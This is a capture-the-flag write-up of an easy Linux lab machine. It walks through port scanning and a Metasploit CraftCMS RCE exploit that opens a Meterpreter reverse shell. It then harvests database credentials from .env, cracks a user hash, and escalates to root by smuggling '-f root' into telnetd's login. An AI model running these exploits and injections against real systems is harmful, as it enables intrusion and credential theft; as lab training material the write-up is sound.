## Description
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

```Description
- Easy
- Linux
```
## Set MTU
```bash
sudo ip link set dev tun0 mtu 1200
```
## Enumeration 
- Rust-Scan
```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://orion.htb/
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
```
- Directory Discovery
```bash
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.git                 (Status: 403) [Size: 162]
.htaccess            (Status: 403) [Size: 162]
.htpasswd            (Status: 403) [Size: 162]
admin                (Status: 302) [Size: 0] [--> http://orion.htb/admin/login]
assets               (Status: 301) [Size: 178] [--> http://orion.htb/assets/]
index                (Status: 200) [Size: 12272]
logout               (Status: 302) [Size: 0] [--> http://orion.htb/]
p10                  (Status: 200) [Size: 12272]
p13                  (Status: 200) [Size: 12272]
p1                   (Status: 200) [Size: 12272]
p2                   (Status: 200) [Size: 12272]
p15                  (Status: 200) [Size: 12272]
p3                   (Status: 200) [Size: 12272]
p5                   (Status: 200) [Size: 12272]
p7                   (Status: 200) [Size: 12272]
wp-admin             (Status: 418) [Size: 54217]
```
----
- Web App `/admin/login` shows CraftCMS 5.1.16 which is vulnerable to RCE using `PHP`
```bash
$msf exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) > options

Module options (exploit/linux/http/craftcms_preauth_rce_cve_2025_32432):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   ASSET_ID  884              yes       Existing asset ID
   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4, sock
                                        s5, socks5h, http
   RHOSTS    10.129.111.62    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.ht
                                        ml
   RPORT     80               yes       The target port (TCP)
   SSL       false            no        Negotiate SSL/TLS for outgoing connections
   VHOST                      no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.42      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   PHP In-Memory


View the full module info with the info, or info -d command.

msf exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) > exploit
[*] Started reverse TCP handler on 10.10.14.42:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[!] Cannot reliably check exploitability. Could not retrieve session & CSRF ForceExploit is enabled, proceeding with exploitation.
[*] Injecting stub & triggering payload...
[*] Exploit completed, but no session was created.
msf exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) > exploit http://orion.htb/admin/login
[*] Started reverse TCP handler on 10.10.14.42:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] Leaked session.save_path: /var/lib/php/sessions
[+] The target is vulnerable. Session path leaked
[*] Injecting stub & triggering payload...
[*] Sending stage (42137 bytes) to 10.129.111.62
[*] Meterpreter session 1 opened (10.10.14.42:4444 -> 10.129.111.62:58936) at 2026-07-11 09:17:44 -0400

meterpreter > sysinfo
Computer        : orion
OS              : Linux orion 5.15.0-177-generic #187-Ubuntu SMP Sat Apr 11 22:54:33 UTC 2026 x86_64
Architecture    : x64
System Language : en_US_POSIX
Meterpreter     : php/linux
meterpreter > session
[-] Unknown command: session. Did you mean sessions? Run the help command for more details.
meterpreter > shell
Process 1666 created.
Channel 0 created.
ls
assets
cpresources
index.html
index.php
whoami
www-data
pwd
/var/www/html/craft/web
```
- Enumerating the user `www-data`
```bash
ls -la
total 364
drwxrwxr-x  7 www-data www-data   4096 Mar  6 11:22 .
drwxr-xr-x  3 root     root       4096 Mar  6 11:19 ..
-rw-rw-r--  1 www-data www-data    718 Mar  6 11:24 .env
-rw-rw-r--  1 www-data www-data    411 Nov 18  2025 .env.example.dev
-rw-rw-r--  1 www-data www-data    623 Nov 18  2025 .env.example.production
-rw-rw-r--  1 www-data www-data    619 Nov 18  2025 .env.example.staging
-rw-rw-r--  1 www-data www-data     31 Nov 18  2025 .gitignore
-rw-rw-r--  1 www-data www-data    624 Nov 18  2025 bootstrap.php
-rw-rw-r--  1 www-data www-data    611 Mar  6 11:20 composer.json
-rw-rw-r--  1 www-data www-data 310507 Mar  6 11:20 composer.lock
drwxrwxr-x  4 www-data www-data   4096 Mar  6 11:26 config
-rwxr-xr-x  1 www-data www-data    309 Nov 18  2025 craft
drwxrwxr-x  5 www-data www-data   4096 Mar  6 11:24 storage
drwxrwxr-x  2 www-data www-data   4096 Mar 10 10:46 templates
drwxrwxr-x 49 www-data www-data   4096 Mar  6 11:20 vendor
drwxrwxr-x  4 www-data www-data   4096 Mar  7 15:31 web
cat .env
# Read about configuration, here:
# https://craftcms.com/docs/5.x/configure.html

# The application ID used to to uniquely store session and cache data, mutex locks, and more
CRAFT_APP_ID=CraftCMS--67912ad2-1f1b-4993-bfec-e64daa5c23ff

# The environment Craft is currently running in (dev, staging, production, etc.)
CRAFT_ENVIRONMENT=dev

# General settings
CRAFT_SECURITY_KEY=[app key omitted]
CRAFT_DEV_MODE=true
CRAFT_ALLOW_ADMIN_CHANGES=true
CRAFT_DISALLOW_ROBOTS=true
CRAFT_DB_DRIVER=mysql
CRAFT_DB_SERVER=127.0.0.1
CRAFT_DB_PORT=3306
CRAFT_DB_DATABASE=orion
CRAFT_DB_USER=root
CRAFT_DB_PASSWORD=[password omitted]
CRAFT_DB_SCHEMA=
CRAFT_DB_TABLE_PREFIX=

PRIMARY_SITE_URL=http://orion.htb/
```
- Creds
```bash
CRAFT_DB_USER=root
CRAFT_DB_PASSWORD=[password omitted]
CRAFT_DB_DATABASE=orion
```
- Created Reverse-shell and python to stable the session 
```bash
www-data@orion:~/html/craft$ mysql -h 127.0.0.1 -P 3306 -u root -p'[password omitted]'
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 20570
Server version: 10.6.23-MariaDB-0ubuntu0.22.04.1 Ubuntu 22.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| orion              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.001 sec)

MariaDB [(none)]> USE orion;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [orion]> SHOW TABLES;
| users                      |
MariaDB [orion]> SELECT * FROM users;
user            |  password |
adam@orion.htb | [hash omitted] |
```
- `Hashcat` 
```bash
$ haiti '[hash omitted]' --hashcat-only
bcrypt [HC: 3200]
Blowfish(OpenBSD) [HC: 3200]
Woltlab Burning Board 4.x
bcrypt(sha256($pass)) / bcryptsha256 [HC: 30600]

[hash omitted]:[password omitted]
```
### SSH
```bash
adam@orion:~$ ls
user.txt
adam@orion:~$ cat user.txt
[flag omitted]
```
- Enumeration 
```bash
adam@orion:~$ ps aux | grep inetd
root        1037  0.0  0.0   2836  1864 ?        S    10:49   0:00 /usr/sbin/inetutils-inetd

adam@orion:~$ cat /etc/inetd.conf
# /etc/inetd.conf: see inetd(8) for further informations.
#
# Internet superserver configuration database.

#:STANDARD: These are standard services.
127.0.0.1:telnet stream tcp nowait root /usr/local/sbin/telnetd telnetd
```
**Key findings:**
- Telnet service bound to localhost only
- Runs as **root**
- Uses custom telnetd at `/usr/local/sbin/telnetd`
```bash
adam@orion:~$ ls -la /usr/local/sbin/telnetd
lrwxrwxrwx 1 root root 20 Mar  6 14:00 /usr/local/sbin/telnetd -> /usr/libexec/telnetd

adam@orion:~$ file /usr/libexec/telnetd
/usr/libexec/telnetd: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=1bfa6050e77393b6f39c8a17833431d818938d20, for GNU/Linux 3.2.0, with debug_info, not stripped

adam@orion:~$ strings /usr/libexec/telnetd | grep -i -E "password|login|root|auth"
auth
exec-login
set program to be executed instead of standard login(1)
do not print host information before login has been completed
/usr/bin/login -p -h %h %?u{-f %u}{%U}
can't expand login command line
AUTHENTICATION
```
##### Exploitation
- Privilege Escaltion
```bash
adam@orion:~$ USER="-f root" telnet -a 127.0.0.1
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.

Linux 5.15.0-177-generic (orion) (pts/1)

Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-177-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

root@orion:~# whoami
root
root@orion:~# pwd
/root

root@orion:~# ls
root.txt  snap

root@orion:~# cat root.txt
[flag omitted]
```
# END